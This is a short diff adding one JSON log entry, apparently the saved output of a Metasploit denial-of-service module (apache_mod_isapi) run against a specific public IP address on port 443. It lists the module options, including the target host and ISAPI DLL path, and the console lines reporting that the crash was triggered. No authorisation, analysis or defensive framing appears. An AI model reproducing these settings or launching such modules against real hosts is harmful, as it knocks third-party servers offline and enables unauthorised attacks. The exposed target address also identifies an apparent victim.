@@ -1,0 +1,16 @@
+{"ip":"27.221.59.244:443","protocol":"http","module":"auxiliary/dos/http/apache_mod_isapi","result":"VERBOSE => true
+RPORT => 443
+SSL => false
+SSLVersion => Auto
+SSLVerifyMode => PEER
+ConnectTimeout => 10
+TCP::max_send_size => 0
+TCP::send_delay => 0
+ISAPI => /cgi-bin/SMTPSend.dll
+RHOSTS => 27.221.59.244
+DisablePayloadHandler => True
+[*] Running module against 27.221.59.244
+[*] 27.221.59.244:443 - Causing the ISAPI dll to be loaded and unloaded...
+[*] 27.221.59.244:443 - Triggering the crash ...
+[*] Auxiliary module execution completed
+"}
